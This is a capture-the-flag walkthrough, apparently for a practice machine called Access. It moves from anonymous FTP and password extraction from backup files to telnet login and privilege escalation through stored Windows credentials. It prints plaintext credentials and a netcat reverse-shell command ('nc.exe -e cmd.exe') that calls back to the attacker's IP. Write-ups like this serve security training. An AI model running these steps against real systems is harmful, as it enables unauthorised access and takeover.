Here’s what nmap teaches us :

- port 21 (FTP) - Anonymous login
- port  23 (TELNET)
- port 80 (HTTP) - IIS 7.5

Since I have anonymous access to the FTP, let's use them :

```
ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:liodeus): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
```

There is two directories :

- Backups
- Engineer

```
ftp> cd Backups
ftp> ls
08-23-18  09:16PM              5652480 backup.mdb
ftp> get backup.mdb
```

```
ftp> cd Engineer
ftp> ls
08-24-18  01:16AM                10870 Access Control.zip
ftp> get "Access Control.zip"
```

I downloaded two files from the two directories :

- backup.mdb
- Access Control.zip

I tried to unzip the file but it's protected by a password ! Maybe it's in the backup.mdb, to check for that I used the command strings and I got throught the output line by line looking for something that look like a password : 

```
strings backup.mdb | less
[...]
access4u@security
[...]
```

There was a lot of gibberish strings but one stands out : access4u@security, let's try it as password for the protected zip :

```
7z e Access\ Control.zip

Nice that was the password ! I now have a file name "Access Control.pst", looking on google how to open this file, I found this pst viewer who let you open it in the browser.

I now have credentials :

```
login = security
password = 4Cc3ssC0ntr0ller
```

But where do I use them ? 

Go see the website :

![Website](/assets/imgs/access/webpage.PNG)

There is nothing here and what about the telnet port :

```
telnet 10.10.10.98                             
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login:
```

## Exploit

------

It's asking for a login, let's try them here :

```
telnet 10.10.10.98                             
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

I'm connected nice ! It's time to enumerate, first launch a smbserver for file transfert :

```
sudo smbserver.py -smb2support liodeus ./
```

Then I used Powerless.bat, because .exe wouldn't works :

```
\\10.10.14.4\liodeus\Powerless.bat
```

The interesting part is here :

```
-- Stored Passwords --

Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

Nice the credentials of Administrator are stored, so I can use the command runas as him ! Let's get a reverse shell as Administrator, first upload nc on the box : 

```
copy \\10.10.14.4\liodeus\nc.exe .
```

Launch a nc listener :

```
nc -lvp 1234
```

Then run the command runas with the stored credentials :

```
runas /savecred /user:administrator "nc.exe -e cmd.exe 10.10.14.4 1234"
```

Go see the listener :

```
nc -lvp 1234
listening on [any] 1234 ...

Voila, I now have the Administrator rights and can read the flags.
